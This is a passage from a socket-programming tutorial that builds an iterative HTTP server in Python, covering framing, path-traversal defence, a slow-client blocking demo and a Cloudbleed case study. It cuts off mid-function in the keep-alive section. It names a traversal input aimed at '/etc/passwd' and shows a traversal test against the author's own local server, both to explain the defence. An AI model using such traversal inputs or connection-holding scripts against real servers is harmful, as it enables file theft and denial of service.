# Day 17 — Build an HTTP Server From Raw Sockets

> **Framing.** Day 13 taught you the anatomy of an HTTP message — methods, status codes, headers — as text on the wire. Day 11 taught you what a TCP socket is: `socket()`, `bind()`, `listen()`, `accept()`, the 4-tuple, the SYN queue and the accept queue. Today those two things get fused: you are going to write the program that sits between them, the one nobody usually has to write because uvicorn, gunicorn, and Nginx already wrote it. By the end of today "worker," "event loop," and "ASGI server" (Day 28) stop being vocabulary you recognize and become things you have personally implemented, broken, and fixed.
>
> This is a pure build day, and it is structured as a climb: the same climb the server-software industry actually made, in the same order, for the same reasons. You will write a server that handles exactly one client at a time (and watch it fall over the instant a second client shows up while the first is slow). You will fix that with a thread per connection (and watch *that* fall over once connections start piling up — this is Day 3's C10K problem, reproduced by your own hand instead of read about). You will fix *that* with a single-threaded event loop built on `selectors`/`epoll` (Day 5), and then discover event loops have their own, different failure mode, and you will watch that happen too. Every step is driven by a concrete failure you can reproduce on your own machine, not by an abstract argument.
>
> Two prior notes are load-bearing here and I will not re-derive them: Day 3 (`d3-os-threads-scheduling-races.md`) already built threads, races, deadlock, context-switch cost, the C10K wall, and Little's-Law thread-pool sizing from first principles; Day 5 (`d5-os-files-io-descriptors.md`) already built blocking vs. non-blocking I/O and `select`/`poll`/`epoll` from first principles, including a runnable `selectors`-based echo server. Today reuses all of that machinery to solve a new, concrete problem — an HTTP server — and points back to those sections by number instead of repeating them. If a paragraph here says "Day 3 §1.6," go read that paragraph once; it will not be restated.
>
> **The agentic connection, stated once and then left alone.** This note is almost entirely backend/systems, and that is the correct, honest state of affairs — forcing an agentic angle onto socket plumbing would be exactly the kind of padding these notes are built to avoid. There is exactly one place, later, where the connection is real and load-bearing rather than decorative: when you build the event-loop server, you will rediscover — by breaking your own server — the single rule that governs every async agent framework: **one synchronous, blocking call inside an event loop stalls every other piece of work sharing that loop**, whether that "other work" is another HTTP client or another in-flight tool call inside an agent's coroutine. That is the same failure mode from opposite ends, and it is taught once, where it happens, in concept 5.

---

## Roadmap

Every version of this server answers the same question differently: **while one client's request is being handled, what does everyone else do?** That single question, asked three times, produces the entire history of server architecture.

```
The problem: a listening socket (Day 11) hands you TCP bytes.
HTTP clients expect a request-shaped conversation and a timely reply.
                            │
        Something must read bytes, find a REQUEST boundary in them,
              route it, and write back a RESPONSE boundary.
                            │
                    THE ACCEPT LOOP
              (concept 1: parse, route, respond)
                            │
       While handling client A, what happens to client B?
                            │
        ┌───────────────────┼────────────────────┐
        │                   │                    │
   SERVE THEM LATER    GIVE B ITS OWN        WATCH BOTH SOCKETS
   (ITERATIVE)          WORKER               AT ONCE, ON ONE THREAD
   one at a time,      (THREAD-PER-          (EVENT LOOP / epoll,
   B waits for A        CONNECTION,           Day 5 §1.6)
   no matter what        Day 3 §1.1–1.7)            │
        │                   │                    one blocking call
   1 slow client =    C10K wall: a thread      inside a handler now
   TOTAL outage       per idle connection      stalls EVERY connection
   (concept 1)         is absurdly costly            │
                       (Day 3 §1.6)             cheap per-idle-conn,
                            │                   but needs ITS OWN
                    keep-alive (concept 2)      timeout logic — epoll
                    makes "idle" the NORMAL     gives you readiness,
                    state of most connections,  never "this has been
                    which is what turns the     silent too long"
                    thread cost from annoying         │
                    to catastrophic under load        │
        └───────────────────┴────────────────────┘
                            │
              A client that trickles bytes very slowly
              is indistinguishable from a client on a
              bad network connection — UNTIL you set a
              deadline. Every architecture needs one.
                            │
                TIMEOUTS + SLOWLORIS (concept 6)
              (idle-read timeout vs. absolute
               header/body deadline vs. connection caps)
                            │
              Real servers don't pick ONE model —
              they let you choose per deployment
                            │
                 GUNICORN'S WORKER ZOO (concept 7)
              sync = concept 1+2, gthread = concept 4,
              gevent/eventlet/uvicorn = concept 5, evolved
```

Concepts and tiers:

| # | Concept | Tier |
|---|---|---|
| 1 | The accept loop: parsing, routing, and responses (the iterative server) | **[CORE]** |
| 2 | HTTP/1.1 keep-alive: many requests, one connection | **[CORE]** |
| 3 | Chunked transfer-encoding, and the framing we didn't implement | **[AWARE]** |
| 4 | Concurrency model I — thread-per-connection | **[CORE]** |
| 5 | Concurrency model II — the event loop (`selectors`/`epoll`) | **[CORE]** |
| 6 | Timeouts and the slowloris attack | **[CORE]** |
| 7 | Gunicorn's worker zoo: sync, gthread, gevent, ASGI workers | **[WORKING]** |
| 8 | What a real ASGI server (uvicorn) adds beyond our build | **[WORKING]** |
| 9 | Benchmarking the ladder — and against Nginx | **[WORKING]** |

**A note on how this note was built.** Every server below was actually written, run, and driven with real clients on a live machine while writing this note — not reasoned about in the abstract. Where a number appears (a timing, a thread count, a byte count), it is a real measurement from that run, not an invented illustration, and I'll say so. Two real bugs surfaced during that testing (an unhandled exception that could crash the event-loop server, and a header-size-limit check that could be silently bypassed) and both are written up as part of concept 5 and concept 6 rather than quietly fixed and hidden — they are exactly the kind of mistake you will make yourself, and seeing them found and fixed is more valuable than a note that pretends the first draft was already correct.

**Platform note.** All code below is pure-stdlib Python (`socket`, `selectors`, `threading`, `concurrent.futures`) and runs unmodified on Windows, macOS, and Linux. The one thing that differs by platform is *which* mechanism `selectors.DefaultSelector()` picks underneath you — `EpollSelector` on Linux, `KqueueSelector` on macOS/BSD, `SelectSelector` on Windows (Day 5 §1.6). The code and the lesson are identical everywhere; only the printed selector class name changes. If you want to see `EpollSelector` specifically, run it in WSL2 or a Linux container, exactly as Day 3/5 recommend.

---

## 1. The accept loop: parsing, routing, and responses

**Depth: [CORE]**

### Intuition

A listening socket, after `bind()` and `listen()` (Day 11 concept 4), can do exactly one thing on its own: hand you a new connected socket every time `accept()` returns. That new socket is a raw, bidirectional stream of bytes — TCP has no idea what HTTP is, and neither does the socket. Everything that makes a collection of bytes into "an HTTP request" and a reply into "an HTTP response" is application code you have to write. That gap — from *a stream of bytes* to *a request/response cycle* — is the entire subject of this section, and it is exactly the gap uvicorn, gunicorn, and every other HTTP server fill.

Three sub-problems hide inside that gap, and it's worth naming them before writing any code, because each one is a place people get it wrong:

1. **Framing.** TCP has no concept of "message boundaries" — it's a stream, not a sequence of packets you get to open one at a time (Day 11's whole point about TCP being a byte-stream protocol, not a message protocol). A single `recv()` call might return half a request, one whole request, or three requests glued together, depending on network timing that has nothing to do with what the client actually sent. **You must invent your own rule for "where does this request end,"** and HTTP/1.1's rule (RFC 9112 §2.2) is: the request line and headers end at the first bare `\r\n\r\n`; the body's length is then determined by a `Content-Length` header (or, for chunked encoding, by the chunks themselves — concept 3). Get the framing rule wrong and you either hang forever waiting for bytes that were already sent, or you slice one client's second request off the front of what should be a fresh read.
2. **Routing.** Once you have a complete, framed request, you know a method and a path (`GET /api/time`). Deciding *what code runs* for that combination is routing — in a real framework this is a whole subsystem (path parameters, method dispatch tables, middleware); here it's an `if/elif` chain, which is fine, because the point today is to see the mechanism, not to build a framework.
3. **Responding.** The reply also needs a self-describing frame — a status line, headers (crucially `Content-Length`, so the client's parser also knows where *your* message ends), and a body — written back onto the same socket.

None of this is hard in isolation. What makes it worth a full day is that the *simplest possible correct way to loop over this* — handle one client fully, then look for the next — has a catastrophic failure mode that is invisible until you test it with more than one client, which is exactly what the rest of this note is about.

### Analogy — a single ticket window

Picture a government office with one clerk and one ticket window. A visitor steps up, states their business, the clerk handles it fully (looks something up, stamps a form, hands it back), and only then calls the next number. This is *correct* — every visitor eventually gets served, and the clerk never confuses one visitor's paperwork with another's, because there is never more than one visitor's paperwork on the counter at a time. It is also the whole architecture of this section's server: `accept()` is calling the next number, and everything between `accept()` and going back to call the next number is "serving this one visitor to completion."

**Where the analogy breaks:** a human clerk visibly *finishes* — you can see them stamp the form and know the interaction is nearly over. A network client gives you no such visible cue. If the person at the window today decides to think out loud for twenty minutes before stating their business, or simply stands there saying nothing, the clerk has no way to know whether they're about to speak or have wandered off entirely — and unless the clerk is willing to walk away first, everyone else in the building queues behind that one silent visitor, indefinitely. A human clerk would eventually just ask, or call security. Our first server, as built below, has no such instinct: `recv()` just waits. That single gap — a blocking call with no notion of "this has taken too long" — is the exact seed of both this section's worked example and concept 6's slowloris attack.

### Worked example — reading the framing rule off real bytes

Before any code, look at what actually arrives at a listening socket when a browser or `curl` connects. Here is a literal, byte-for-byte capture of what `curl http://127.0.0.1:8080/api/time` puts on the wire (I captured this from a real `recv()` call while building the server below):

```
GET /api/time HTTP/1.1\r\n
Host: 127.0.0.1:8080\r\n
User-Agent: curl/8.4.0\r\n
Accept: */*\r\n
\r\n
```

Five things to read off this, mechanically, because each one becomes a line of code:

1. **Every line ends `\r\n`**, not just `\n` — this is CRLF, mandated by RFC 9112 §2.2, and it is *not* what Python's own text files use on Unix. Splitting on `\n` alone will leave a trailing `\r` stuck to the end of every header value — a classic, silent bug (a `Host` value of `"127.0.0.1:8080\r"` compares unequal to `"127.0.0.1:8080"` in ways that are miserable to debug).
2. **The first line is special** — method, path, and version, space-separated. Every line after it, until the blank line, is a header: `Name: value`.
3. **A single blank line (`\r\n` with nothing before the next `\r\n`) ends the headers.** That blank line — the literal byte sequence `\r\n\r\n` when you look at the raw stream rather than line-by-line — is the ONLY universal signal that "the request's metadata is complete." There is no length prefix, no magic number; you find it by scanning for that four-byte sequence.
4. **This particular request has no body** (`GET` requests normally don't), so the blank line is also the end of the *entire* request. Had this been a `POST` with a JSON payload, a `Content-Length: 27` header would appear among the headers, and exactly 27 more bytes would follow the blank line — bytes you must keep reading even after you've found `\r\n\r\n`, because `\r\n\r\n` only marks the end of headers, never the end of the message when a body is present.
5. **`curl` sent this all in one `write()`** on its end, but nothing guarantees your `recv()` gets it all in one call. On a loopback connection to a fast local server this typically arrives as a single TCP segment and a single `recv()` call returns the whole thing — but "typical" is not "guaranteed," and code that silently assumes one `recv()` equals one request will work in every test you run locally and fail unpredictably against a real client on a real, congested network path, where a large header set or a slow mobile connection can easily split one request across many reads.

That fifth point is the one people skip, and it's why the code below is structured as a *loop that keeps calling `recv()` until it has proof of a complete request*, never as a single `recv()` call that's assumed to be enough.

### Runnable example — the iterative HTTP server

```python
# iterative_server.py — an HTTP server on raw sockets, ONE client at a time.
# stdlib only. Run:  python iterative_server.py
#   then, in another terminal:
#     curl http://127.0.0.1:8080/api/time
#     curl http://127.0.0.1:8080/static/hello.txt
import json
import os
import socket
import time

HOST, PORT = "127.0.0.1", 8080
STATIC_DIR = os.path.join(os.path.dirname(__file__), "static")
MAX_HEADER_BYTES = 16 * 1024        # demo-only cap -- see concept 6 for why this matters

os.makedirs(STATIC_DIR, exist_ok=True)
with open(os.path.join(STATIC_DIR, "hello.txt"), "w") as f:
    f.write("hello from the static directory\n")


def recv_request(conn: socket.socket):
    """Read bytes off the socket until we have a FULL request (headers + body).
    Returns (method, path, version, headers, body), or None if the peer closed
    before sending a complete request."""
    buf = b""
    while b"\r\n\r\n" not in buf:
        chunk = conn.recv(4096)
        if not chunk:
            return None                       # peer closed before headers were complete
        buf += chunk
        if len(buf) > MAX_HEADER_BYTES:
            raise ValueError("request header too large")

    head, _, body = buf.partition(b"\r\n\r\n")
    lines = head.split(b"\r\n")
    method, path, version = lines[0].decode("latin-1").split(" ")

    headers = {}
    for line in lines[1:]:
        name, _, value = line.decode("latin-1").partition(":")
        headers[name.strip().lower()] = value.strip()

    content_length = int(headers.get("content-length", 0))
    while len(body) < content_length:
        chunk = conn.recv(4096)
        if not chunk:
            break
        body += chunk

    return method, path, version, headers, body


def build_response(status: int, reason: str, body: bytes, content_type: str):
    headers = [
        f"HTTP/1.1 {status} {reason}",
        f"Content-Type: {content_type}",
        f"Content-Length: {len(body)}",
        "Connection: close",            # every response closes the connection -- concept 2 fixes this
    ]
    head = "\r\n".join(headers) + "\r\n\r\n"
    return head.encode("latin-1") + body


def route(method: str, path: str, headers: dict, body: bytes):
    if method == "GET" and path == "/api/time":
        payload = json.dumps({"utc": time.time(), "pid": os.getpid()}).encode()
        return build_response(200, "OK", payload, "application/json")

    if method == "GET" and path == "/api/slow":
        # A stand-in for a real I/O-bound handler (a DB call, an upstream API).
        # Used later to demonstrate concurrency -- ignore it for now.
        time.sleep(1.0)
        payload = json.dumps({"slept": 1.0, "pid": os.getpid()}).encode()
        return build_response(200, "OK", payload, "application/json")

    if method == "GET" and path.startswith("/static/"):
        # Resolve safely INSIDE STATIC_DIR -- reject path traversal like
        # "/static/../iterative_server.py" before ever opening a file.
        requested = os.path.normpath(os.path.join(STATIC_DIR, path[len("/static/"):]))
        if not requested.startswith(os.path.abspath(STATIC_DIR)):
            return build_response(403, "Forbidden", b"forbidden\n", "text/plain")
        if not os.path.isfile(requested):
            return build_response(404, "Not Found", b"not found\n", "text/plain")
        with open(requested, "rb") as f:
            data = f.read()
        return build_response(200, "OK", data, "text/plain")

    return build_response(404, "Not Found", b"not found\n", "text/plain")


def handle_client(conn: socket.socket, addr):
    try:
        parsed = recv_request(conn)
        if parsed is None:
            return
        method, path, version, headers, body = parsed
        print(f"  [{addr}] {method} {path} {version}  ({len(headers)} headers, "
              f"{len(body)} body bytes)")
        conn.sendall(route(method, path, headers, body))
    except Exception as exc:
        try:
            conn.sendall(build_response(400, "Bad Request", f"{exc}\n".encode(), "text/plain"))
        except OSError:
            pass
    finally:
        conn.close()


def serve_forever():
    lsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    lsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)   # Day 11 concept 9
    lsock.bind((HOST, PORT))
    lsock.listen(128)                                             # Day 11 concept 4
    print(f"iterative server listening on http://{HOST}:{PORT}  (pid {os.getpid()})")

    while True:
        conn, addr = lsock.accept()          # BLOCKS here until a client connects
        handle_client(conn, addr)            # and THIS blocks until that client is done
        # No other client can even be ACCEPTED until handle_client() returns.


if __name__ == "__main__":
    serve_forever()
```

Real invocation and real output, captured while writing this:

```
$ python iterative_server.py
iterative server listening on http://127.0.0.1:8080  (pid 24544)
```
```
$ curl -s http://127.0.0.1:8080/api/time
{"utc": 1787569892.059461, "pid": 24544}
```
```
$ curl -s http://127.0.0.1:8080/static/hello.txt
hello from the static directory
```
```
$ curl -s -o /dev/null -w "%{http_code}\n" http://127.0.0.1:8080/nope
404
```
```
$ curl -s --path-as-is -o /dev/null -w "%{http_code}\n" "http://127.0.0.1:8080/static/../iterative_server.py"
403
```

**Why this works, line by line.**

- `recv_request`'s `while b"\r\n\r\n" not in buf:` loop is the framing rule from the worked example, implemented directly: keep accumulating bytes until the terminator has definitely arrived, and only then stop asking. Note the `MAX_HEADER_BYTES` check happens **inside** the loop, after every append, unconditionally — not only when the terminator is still missing. That ordering matters more than it looks; concept 5 documents a real bug that comes from getting this subtly wrong.
- `int(headers.get("content-length", 0))` and the follow-up `while len(body) < content_length:` loop is the second half of framing: once headers are known, the body's length is *data*, not structure — you read exactly that many more bytes, no more, no less. A body-less `GET` has `content_length == 0`, so this loop simply doesn't run.
- `build_response` always writes `Connection: close`. This is deliberate and is this section's biggest simplification: after every single reply, the TCP connection is torn down (Day 11 §9's teardown, `FIN`/`TIME_WAIT`), and the next request — even from the *same* browser tab a millisecond later — pays for a brand-new TCP handshake (Day 11 §4) from scratch. That's correct HTTP/1.0-style behavior, and it's honestly wasteful; concept 2 is entirely about removing this line.
- The static-file branch is the one place this toy server has to think about security rather than just correctness. `path[len("/static/"):]` takes whatever the client put after `/static/` verbatim — including `../../etc/passwd` if a hostile client sends it. `os.path.normpath` collapses the `..` segments, and the `requested.startswith(os.path.abspath(STATIC_DIR))` check then verifies the *result* is still inside the intended directory before ever calling `open()`. This is the generic shape of every path-traversal defense: never trust a client-supplied path string; resolve it first, then check where it actually landed. Skipping this check is a genuinely common, genuinely exploited class of bug in hand-rolled static file servers (a fresh, distinct example of exactly this class of failure — a parser trusting attacker-controlled input without bounding it — is this section's case study below).
- The `except Exception` in `handle_client` is a deliberate, honest catch-all: a malformed request (`method.split(" ")` raising `ValueError` because there weren't exactly three space-separated tokens) would otherwise propagate up and crash the *entire* accept loop, taking down the server for every future client over one bad request. Catching it and replying `400 Bad Request` keeps the server alive; note this is different from, and simpler than, the same problem in the event-loop server (concept 5), where an unhandled exception is even more dangerous because there's no per-client thread boundary to contain it.

**Honesty caveats (demo-only, stated plainly).** This parser is deliberately minimal and would be a poor citizen on the open internet as written: it does not lowercase or fold repeated headers per RFC 9112's rules, it doesn't handle `Expect: 100-continue`, it has no support for chunked request bodies (concept 3), and `int(headers.get("content-length", 0))` will raise an uncaught `ValueError` (crashing that one client's handling, caught by the outer `except Exception`, but not gracefully) if a client sends a non-numeric `Content-Length`. None of that is a good reason to avoid building this — it's the reason production code doesn't hand-roll HTTP parsing (this section's system design below goes through exactly that decision).

### Visual — where the iterative server's one worker spends its time

```
   accept() ──► recv (headers) ──► recv (body, if any) ──► route() ──► sendall() ──► close() ──► accept() …
      │              │                     │                  │            │
      └── BLOCKS ─────┴── BLOCKS ───────────┴── usually fast ──┴── BLOCKS ──┘
          until a       until \r\n\r\n                                      until bytes
          client         arrives, or                                       are accepted
          connects       forever if it                                     by the kernel
                         never does                                        send buffer

   EVERY arrow above is sequential. There is no second thread, no second
   socket ever touched, no way to "pause" one client and glance at another.
   The gap between two consecutive accept() calls is EXACTLY the total time
   spent on the client in between -- however long that turns out to be.
```

### Worked example — proving the one-client-at-a-time limit, with real numbers

The claim "one slow client blocks everyone" is easy to state and easy to disbelieve until you watch it happen. Here is a real, reproducible demonstration using a second tiny script that connects and then does nothing:

```python
# hold_connection.py — connect and sit there, sending nothing.
# Run:  python hold_connection.py [seconds]
import socket, sys, time
seconds = float(sys.argv[1]) if len(sys.argv) > 1 else 10
s = socket.create_connection(("127.0.0.1", 8080))
print(f"connected, holding for {seconds}s without sending a byte...")
time.sleep(seconds)
s.close()
```

Run the iterative server, then in one terminal start `python hold_connection.py 6` and, a fraction of a second later, in a second terminal time an ordinary request:

```
$ python hold_connection.py 6 &
connected, holding for 6.0s without sending a byte...

$ time curl -s http://127.0.0.1:8080/api/time
{"utc": 1787569979.7886083, "pid": 25308}

real    0m5.838s
user    0m0.000s
sys     0m0.031s
```

**That `5.838s` is a real, measured number from this exact setup**, not an estimate. Walk through why it's almost exactly the hold duration: `hold_connection.py`'s socket completes its TCP handshake instantly and sits in the OS's *accept queue* (Day 11 §4 — the queue of fully-handshaken connections waiting for the application to call `accept()`) the moment it connects. The server's single thread is inside `lsock.accept()` at that instant, which returns immediately for this connection — there is nothing else running yet, so it's accepted right away and `handle_client` starts, blocking inside `recv()` waiting for bytes that never come. **`curl`'s connection also completes its TCP handshake instantly** — the *kernel* accepted it into the backlog queue without any help from our Python code, exactly as Day 11 describes: the three-way handshake and `accept()` are decoupled. But our process's *single* thread is still parked inside `recv()` for the first client and will not call `accept()` again until that call returns — which only happens when `hold_connection.py`'s `time.sleep(6)` finishes and its socket closes, sending a TCP FIN that makes `recv()` return `b""` (end-of-stream). Only then does `handle_client` return, the loop calls `accept()` again, and `curl`'s already-waiting connection is finally picked up and served — instantly, since serving it is cheap once it starts. The result: from `curl`'s point of view, **a fully healthy, instantly-responding server appeared to take six seconds**, for a reason that has nothing to do with the code path `curl` actually exercised.

This is the single most important fact about the iterative model, and it does not require malice to trigger: a client on a slow mobile connection, a client that pauses mid-request because its own CPU is busy, or a load balancer's health-check probe that opens a connection slightly before sending its request — any of these produces exactly this effect on every *other* client, for exactly as long as the slow one takes. Section 6 turns this from an accident into a deliberate attack.

### Under the hood

There is no additional machinery below what's already visible in the code: `accept()`, `recv()`, and `send()`/`sendall()` are thin wrappers over the `accept(2)`, `recv(2)`, and `send(2)` (or `write(2)`) system calls, and the reason the loop blocks exactly where it does is the same reason any blocking syscall blocks — the kernel puts the calling thread on a wait queue and doesn't return control until the relevant event (data arrived, a connection completed) has actually happened (Day 5 §1.5's blocking-I/O treatment covers this precisely; it isn't repeated here). The one thing worth being explicit about is that **there is exactly one thread of control in this entire program**, so "blocked in `recv()`" and "unable to do anything else, including call `accept()` again" are the same fact stated two ways. That single-thread-ness is a *choice*, not a law of sockets — concepts 4 and 5 are the two different ways of un-choosing it.

**Deliberate stop.** I'm not opening the TCP stack's internal buffering here (how many bytes the kernel will hold before `recv()` must be called to make room, what happens if the client's `send()` outpaces the server's reads) — that's Day 11 territory and isn't new today. What's new today is purely the application-level control-flow choice of "one client, start to finish, before the next."

### System design — hand-roll the parser, or adopt a battle-tested one?

**Problem.** You're building a real internal service that needs to speak HTTP/1.1 correctly, including edge cases: folded headers, multiple `Content-Length` values from a misbehaving upstream, `Transfer-Encoding: chunked` (concept 3), pipelined requests. Do you extend the parser above, or replace it?

**Requirements.** Correctness against RFC 9112's actual grammar (not just the happy path this note tests); resistance to the class of parsing-differential bugs that enable request smuggling (this section's case study); reasonable performance; a maintenance story that doesn't fall entirely on your team.

**The realistic alternatives.** (1) Keep extending the hand-rolled parser above, adding cases as bugs are found. (2) Adopt a dedicated, widely-used HTTP parsing library and keep your own code responsible only for routing and handlers — in Python terms, `h11` (a pure state-machine implementation of RFC 9110/9112 with no I/O of its own, which is what `httpx` and Twisted's HTTP/1.1 support are built on) or `httptools` (Python bindings for Node.js's battle-tested `llhttp` C parser, which is what `uvicorn` actually uses under the hood — concept 8).

**The decision, and the actual reason.** For anything that will ever face traffic you don't fully control — the public internet, another team's client, a partner integration — adopt the library. The reason isn't "libraries are always better than hand-rolled code" as a platitude; it's that **HTTP/1.1's grammar has a long tail of edge cases that were each added to the spec, or clarified in an errata, *because* some real implementation got them wrong** (RFC 9112's entire §11 "Security Considerations" section, and the existence of RFC 9112 itself as a 2022 clarification of ambiguities in the original RFC 7230, is institutional memory of exactly this). A library like `h11` or `llhttp` has already absorbed years of exactly the fuzzing, real-world traffic, and CVE-driven hardening that your hand-rolled parser has absorbed zero hours of. You are not smarter than that accumulated hardening; you are earlier in the same process everyone else already went through.

**The trade-off, honestly.** You lose visibility and control. The code above is roughly 40 lines and you can hold the entire request-reading state machine in your head; `h11`'s state machine, `httptools`'s C extension, and the RFC edge cases they encode are not something you can casually reason about line-by-line anymore. You've also added a dependency with its own release cadence, its own occasional bugs, and its own version-compatibility surface to track.

**The flip condition.** Hand-rolling remains the right call — precisely as it is *today*, in this note — when the goal is pedagogical (you are learning what the library is doing for you), when the protocol surface is deliberately tiny and fully controlled by you on both ends (an internal RPC-over-HTTP-shaped-bytes protocol between two services you own, where you can guarantee no client ever sends anything outside the subset you test), or when you are building the parsing library itself. The moment a request can arrive from a party you don't control — a browser, a third-party webhook sender, anything on the public internet — the library wins, full stop.

### System design — raw sockets, or the standard library's own `http.server`/`socketserver`?

**Problem.** Python ships `http.server.HTTPServer` and `socketserver.ThreadingMixIn` in the standard library — classes that already implement an accept loop, a per-connection handler dispatch, and basic request parsing. Given that they exist, why does this note build the accept loop from `socket` primitives at all, and would a real (non-learning) project ever reach for them?

**Requirements.** For *this note*: the reader needs to see `accept()`, `recv()`, and the framing logic with nothing between them and the code, because the entire point of Day 17 is demystifying what a "server" is at the socket level. For a *real small project*: correctness, low maintenance burden, "good enough" performance for genuinely low-traffic internal tools.

**The decision, and the actual reason.** Today, raw sockets — because `http.server`'s own request-line and header parsing is exactly the kind of mechanism this note exists to expose, and wrapping it in a class would hide the one thing worth seeing. For a real throwaway internal tool (a one-off local dashboard, a CI webhook receiver hit a few times an hour), `http.server` with `ThreadingHTTPServer` is a perfectly reasonable, unglamorous choice — it is standard library, it is "there," and it does the same accept-loop-plus-thread-per-connection shape concept 4 builds by hand, with rather less code.

**The trade-off, honestly.** `http.server` explicitly documents itself as not hardened for internet-facing production use (its own docs say as much), and it inherits the same shape of correctness limitations as the hand-rolled parser above — it was never intended to compete with Nginx or gunicorn. Choosing it for anything internet-facing trades away exactly the correctness/security maturity the previous system design argued for.

**The flip condition.** Move off `http.server` (to Gunicorn+a real framework, concept 7, or to a from-scratch build like today's for genuinely specialized needs) the moment the service faces real, uncontrolled traffic, needs TLS termination done correctly, needs to survive adversarial input, or needs throughput anywhere near what a tuned production server provides. For anything you'd put a domain name on, this flip condition is met on day one.

### Case study — Cloudflare's Cloudbleed (2017): what a parser bug costs when it's wrong

**What happened.** In February 2017, Google Project Zero researcher Tavis Ormandy discovered that Cloudflare's reverse-proxy infrastructure was, under specific conditions, returning **uninitialized memory** — fragments of *other customers' HTTP requests and responses*, including private data like authentication cookies and API keys — appended to the end of unrelated pages, for months before discovery. The root cause, as Cloudflare's own incident report explains, was a buffer-handling bug in an in-house parser (built with the Ragel state-machine compiler, used inside their `cf-html` HTML-rewriting module) that could read one byte *past* the end of a buffer when scanning specific malformed markup near the end of a page, leaking whatever happened to be in adjacent memory into the outgoing response.

**The engineering lesson, tied to this concept.** This wasn't a parser that got a header wrong — it was a parser whose *bounds-checking* was wrong, in a low-level buffer-scanning routine, of the same general shape as "keep advancing a cursor through bytes looking for a delimiter" that this section's `recv_request` function does. The lesson isn't "never write parsers" — it's that **low-level, hand-written scanning code that touches attacker-influenced bytes is exactly where memory-safety and bounds-checking bugs hide**, and that such bugs, in a shared multi-tenant proxy, don't just crash — they can leak *other people's* data across trust boundaries. It's a sharper, more consequential version of this section's path-traversal defense: both are examples of "resolve/bound untrusted input before trusting it," at different layers of the stack.

**Primary sources.** Cloudflare, "Incident report on memory leak caused by Cloudflare parser bug" (24 Feb 2017, Cloudflare's own engineering blog); Tavis Ormandy, Project Zero bug tracker entry #1139, "Cloudflare: Reverse Proxies Are Leaking Memory" (2017).

A second, distinct case study belongs here too, but it fits better once concept 3 has introduced chunked encoding — **HTTP request smuggling**, the class of attack that arises specifically from two different parsers (a front-end proxy and a back-end server) disagreeing about where one request ends and the next begins. Rather than duplicate it, it's covered in full there, since request smuggling depends on exactly the `Content-Length`/`Transfer-Encoding` ambiguity that section introduces.

### In production

**Best practices.** Never write the parsing layer for a public-facing service by hand (see this section's first system design) — use `h11`, `httptools`/`llhttp`, or a full framework's tested request-parsing path. Always resolve and bound any client-supplied filesystem path before touching the filesystem (this section's static-file branch is the minimal, correct pattern — resolve, then check containment, then open). Always cap the size of anything you buffer from an untrusted socket before you have proof of a complete message (`MAX_HEADER_BYTES` above; concept 6 generalizes this into a full abuse-protection design). Log enough about a malformed request (method, path, source address) to investigate later, but never log full bodies or headers by default — they routinely contain credentials.

**Common mistakes, beginner → senior.** *Beginner:* assuming one `recv()` call returns one complete request (this section's worked-example point 5); forgetting `\r\n` vs `\n`. *Intermediate:* building the path-traversal check as a substring search (`".." not in path`) rather than resolving-then-checking-containment — substring checks are trivially bypassed by encoding tricks (`%2e%2e/`, mixed slashes) that survive to the filesystem call unless the path is actually resolved first. *Senior:* trusting a hand-rolled parser in production because "it passed all our tests" — tests you wrote are, by construction, only as adversarial as you were when you wrote them; real attackers and real broken clients are more inventive than any single team's test suite (Cloudbleed above is exactly this failure mode, at a company with a very good security team).

**Failure modes and recovery.** A crash inside request parsing that isn't caught takes down the *entire* iterative server for every future client until it's restarted (this section's blanket `except Exception` exists precisely to prevent that) — the mitigation is a supervisor process (`systemd`, a container orchestrator's restart policy) that brings the process back up, plus fixing the actual bug. An unbounded buffer (no `MAX_HEADER_BYTES`) turns "one client sends a very large or endless header block" into unbounded memory growth — this is a resource-exhaustion vector distinct from, but related to, concept 6's slowloris.

---

## 2. HTTP/1.1 keep-alive: many requests, one connection

**Depth: [CORE]**

### Intuition

Every response in concept 1 ended the connection. That's not free: Day 11 §4 walked the three-way handshake in detail — a `SYN`, a `SYN-ACK`, an `ACK`, minimum one full round trip before a single byte of your actual request can even be sent — and Day 11 §9 walked the teardown, including the `TIME_WAIT` state the closing side has to sit in afterward. A browser loading one HTML page that references ten images, three stylesheets, and a script would, under concept 1's server, pay for **fourteen separate TCP handshakes and fourteen separate teardowns** to fetch fourteen resources from the *same* server, back to back. On a connection with 30ms of round-trip latency, that's over 400ms spent purely on handshakes before any actual content moves — for content that could all have travelled over one connection that was already open.

**Keep-alive is the fix, and the idea is almost embarrassingly simple once framing (concept 1) is solved: don't close the socket after one response. Read another request off the same connection instead, respond again, and repeat — until either side decides to stop.** The entire mechanism is a policy question ("should this connection stay open?") layered on top of infrastructure you've already built (the framing loop that finds one complete request). Nothing about *how* you parse a request changes; what changes is what `handle_client` does after `route()` returns.

### Analogy — the ticket window that doesn't make you leave

Return to concept 1's single-clerk ticket window, but change one rule: instead of the clerk calling the next number the instant your business is done, you're allowed to stay at the window and ask a second question, a third, and so on — as long as you keep having something to ask and don't take too long between questions (the clerk isn't infinitely patient — that's concept 6's timeout). Only when you say "that's all" or walk away does the clerk finally wave in the next person. This clearly serves *you* better (no re-explaining who you are and why you're there each time), and it serves the office better too, *provided* people don't camp at the window doing nothing.

**Where the analogy breaks:** a human visitor asking a second question is unambiguous — they're visibly still standing there, talking. A TCP client that has finished asking everything it plans to ask, but hasn't explicitly said so, looks *identical*, from the clerk's side of the counter, to a client that's about to ask something in five more seconds — both are just silence. The protocol has to make this explicit with actual signaling (the `Connection` header, discussed below) precisely because the underlying transport gives you no visible cue the way body language does for a human.

### Worked example — the framing rule for "where does this connection's traffic end"

HTTP/1.1 (RFC 9112 §9.3) makes persistent connections **the default** — unless either side says otherwise, a connection stays open after a response and the next bytes on it are assumed to be a new request. HTTP/1.0 has the opposite default: connections close unless a client explicitly asks to keep one alive. The exact rule, straight from RFC 9112:

- If either side sends `Connection: close`, the connection closes after the current response, regardless of HTTP version.
- Otherwise, an `HTTP/1.1` request/response defaults to persistent.
- An `HTTP/1.0` request only stays open if the client explicitly sent `Connection: keep-alive` (a pre-standard convention that predates HTTP/1.1, still honored for backward compatibility).

Translating that into code is a single small function:

```python
def wants_keep_alive(version: str, headers: dict) -> bool:
    """RFC 9112 section 9.3: HTTP/1.1 connections are persistent by default;
    HTTP/1.0 connections are not, unless the client explicitly asks. Either
    version can opt OUT with 'Connection: close'."""
    conn_header = headers.get("connection", "").lower()
    if conn_header == "close":
